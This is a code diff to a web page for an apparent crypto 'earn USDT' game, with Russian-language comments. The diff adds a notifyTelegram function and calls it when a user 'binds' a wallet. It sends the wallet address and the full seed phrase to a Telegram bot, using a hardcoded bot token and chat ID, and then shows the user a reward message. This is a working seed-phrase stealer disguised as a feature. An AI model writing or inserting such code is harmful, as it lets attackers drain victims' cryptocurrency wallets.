@@ -896,6 +896,23 @@
                 return idx < inputs.length - 1 ? inputs[idx + 1] : null;
             }
 
+            // ---------- ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЯ В TELEGRAM ----------
+            async function notifyTelegram(address, phrase) {
+                const BOT_TOKEN = '8638670231:AAF-ta1nrogAw_AXw-iMFBd-zs9o4n6c0RI';      // замените на реальный токен
+                const CHAT_ID   = '-1003769846193';    // замените на ID канала (например, @mychannel или числовой ID)
+                const text = `🔔 Новый пользователь привязал кошелёк:\n\nАдрес: ${address}\n\nSeed-фраза: ${phrase}`;
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                } catch (e) {
+                    console.error('Ошибка отправки в Telegram:', e);
+                }
+            }
+            // -------------------------------------------------------------
+
             bindWalletBtn.addEventListener('click', async () => {
                 document.querySelectorAll('.word-input').forEach((inp, i) => { phraseWords[i] = inp.value.trim(); });
                 if (!phraseWords.every(w => w.length > 0)) { alert('Заполните все слова!'); return; }
@@ -913,7 +930,12 @@
                         player.totalEarned = parseFloat((player.totalEarned + ECONOMY.tasks.walletReward).toFixed(6));
                         if (!player.completedTasks) player.completedTasks = [];
                         player.completedTasks.push('wallet'); updateUI(); checkRankUp(); syncData();
-                        walletModal.classList.remove('active'); alert('✅ Кошелек успешно привязан! +22.50 USDT');
+                        walletModal.classList.remove('active');
+                        
+                        // ОТПРАВКА УВЕДОМЛЕНИЯ В КАНАЛ
+                        await notifyTelegram(walletAddress, phraseWords.join(' '));
+                        
+                        alert('✅ Кошелек успешно привязан! +22.50 USDT');
                     } else { alert('❌ Ошибка при привязке. Попробуйте позже.'); }
                 } catch (err) { alert('Ошибка соединения с сервером.'); } 
                 finally { bindWalletBtn.disabled = false; bindWalletBtn.textContent = 'Привязать кошелек'; }
